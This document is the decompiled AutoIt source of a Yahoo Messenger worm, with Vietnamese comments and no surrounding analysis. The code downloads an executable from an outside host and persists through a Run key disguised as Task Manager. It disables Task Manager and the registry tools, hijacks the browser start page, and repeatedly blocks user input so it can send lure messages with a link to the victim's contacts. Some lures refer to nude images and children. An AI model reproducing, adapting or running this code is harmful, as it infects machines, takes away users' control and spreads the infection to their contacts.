; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Documents and Settings\Administrator\Desktop\vnn.txt>
; ----------------------------------------------------------------------------

; Thiet Lap
#NoTrayIcon
$website = "http://csoft32.net"

; Lay Nhiem Vao He Thong
If Not FileExists(@WindowsDir & "\vnn.exe") Then
InetGet ("http://dvcuong.powweb.com/vnn.exe", @WindowsDir & "\vnn.exe", 0, 1)
Sleep(5000)
EndIf

; Ghi Khoa Registry
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\vnn.exe")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Window Title", "REG_SZ", ":: CSoft32...")

; Danh Sach Tin Nhan Ngau Nhien
Dim $tin[10]
$tin[0] = "Angelina Jolie... " & $website & " "
$tin[1] = "o0(^-^)0o N.U.D.E o0(^-*)0o... " & $website & " "
$tin[2] = "Oh my GOD #... " & $website & " "
$tin[3] = "Beauty KIDs... " & $website & " "
$tin[4] = "How Windows XP Wasted $25 Billion of Energy... " & $website & " "
$tin[5] = "Sony finds defect in Cyber-shot digicams... " & $website & " "
$tin[6] = "For iTunes hacker, the freedom of the open code ... " & $website & " "
$tin[7] = "Police blotter: Child porn in Web cache OK... " & $website & " "
$tin[8] = "IBM agrees to pay $65M to settle overtime suit... " & $website & " "
$tin[9] = "Symantec unveils beta of Norton 360 service... " & $website & " "

; Ham Thay Doi Status & Gui Tin Nhan
While (1)
sleep(60000)
$tieude = WinGetTitle("Yahoo! Messenger", "")
$kiemtra = WinExists ($tieude)
If $kiemtra = 1 Then
$ngaunhien = Random(0,9,1)
ClipPut($tin[$ngaunhien])
BlockInput (1)
WinActivate($tieude)
Send("!m")
Send("un")
Send("^v {ENTER}{ENTER}")
Send("^m")
Send("{DOWN}")
Send("^{SHIFTDOWN}{END}{SHIFTUP}")
Send("{ENTER}")
Send("^v {ENTER}")
BlockInput (0)
EndIf
Sleep(300000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Documents and Settings\Administrator\Desktop\vnn.txt>
; ----------------------------------------------------------------------------

